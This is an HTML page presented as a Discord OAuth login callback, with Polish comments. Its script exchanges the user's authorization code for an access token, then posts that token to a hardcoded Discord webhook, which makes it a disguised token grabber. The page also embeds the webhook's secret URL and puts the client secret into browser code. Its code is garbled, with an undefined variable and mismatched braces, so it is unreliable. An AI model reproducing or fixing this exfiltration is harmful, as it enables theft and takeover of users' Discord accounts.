<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Discord Auth Callback</title>
</head>
<body>

<script>
  // Funkcja do pobierania parametrów URL
  function getParameterByName(name, url) {
    if (!url) url = window.location.href;
    name = name.replace(/[\[\]]/g, "\\$&");
    var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
        results = regex.exec(url);
    if (!results) return null;
    if (!results[2]) return '';
    return decodeURIComponent(results[2].replace(/\+/g, " "));
  }

  // Pobranie kodu autoryzacyjnego z parametrów URL
  // Pobranie kodu autoryzacyjnego z parametrów URL
var code = getParameterByName('code');

if (code) {
  // Wymiana kodu autoryzacyjnego na token dostępu użytkownika
  fetch('https://discord.com/api/oauth2/token', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: new URLSearchParams({
      client_id: 'TWÓJ_CLIENT_ID',
      client_secret: 'TWÓJ_CLIENT_SECRET',
      grant_type: 'authorization_code',
      code: code,
      redirect_uri: 'https://torch-studios.github.io/sfa/auth-callback',
      scope: 'identify' // Zakresy, które wykorzystujesz
    })
  })
  .then(response => response.json())
  .then(data => {
    var userAccessToken = data.access_token;
    
    // Teraz zmienna userAccessToken zawiera token dostępu użytkownika
    // Możesz go wykorzystać do wykonywania zapytań API w imieniu użytkownika
  })
  .catch(error => {
    console.error('Wystąpił błąd podczas wymiany kodu autoryzacyjnego na token:', error);
  });
}


      // Wysyłanie tokenu dostępu na webhook
      var webhookURL = 'https://discord.com/api/webhooks/1140998814434603128/X6xRfXdDHMFW2B12EJwvs-CYEl2NVEWHzLsz1SIW_7gIjBZKwYRdZXEsg-L2ZSXPtPNl'; // Zaktualizuj na właściwy URL webhooka
      fetch(webhookURL, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          content: `Token dostępu: ${accessToken}`
        })
      });
    })
    .catch(error => {
      console.error('Błąd:', error);
    });
  }
</script>

</body>
</html>
